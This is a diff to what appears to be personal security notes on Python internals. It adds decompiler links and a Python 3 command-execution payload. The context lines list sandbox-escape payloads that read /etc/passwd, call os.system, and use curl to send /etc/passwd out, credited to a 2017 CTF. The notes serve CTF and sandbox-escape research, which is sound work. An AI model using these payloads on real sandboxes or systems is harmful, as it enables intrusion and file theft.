@@ -12,6 +12,8 @@ source .venv/bin/activate
 http://sebastianraschka.com/Articles/2014_deep_python.html
 
 # decompile
+https://github.com/rocky/python-uncompyle6
+https://github.com/zrax/pycdc
 https://www.fireeye.com/blog/threat-research/2016/04/deobfuscating_python.html uncompyle2 or meta https://github.com/wibiti/uncompyle2 http://srossross.github.io/Meta/html/api/decompile.html
 https://github.com/alex/python-decompiler
 https://sourceforge.net/p/pyinstallerextractor/tickets/5/
@@ -33,6 +35,8 @@ https://doar-e.github.io/blog/2014/04/17/deep-dive-into-pythons-vm-story-of-load
 ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()
 ''.__class__.__mro__[2].__subclasses__()[59].__repr__.im_func.func_globals['__builtins__']['globals']()"
 ''.__class__.__mro__[2].__subclasses__()[59].__enter__.__func__.__globals__['linecache'].checkcache.__globals__['os'].system('curl%20me%20-Ffoo%3d%40/etc/passwd') # bsidessf ctf 2017
+
+python3: bytes(str(__builtins__['__import__'] ('subprocess').check_output('cat'+chr(32)+'...',shell=True))+'\n','utf-8')
 
 # sanbox escape via memory corruption
 https://medium.com/@gabecpike/python-sandbox-escape-via-a-memory-corruption-bug-19dde4d5fea5
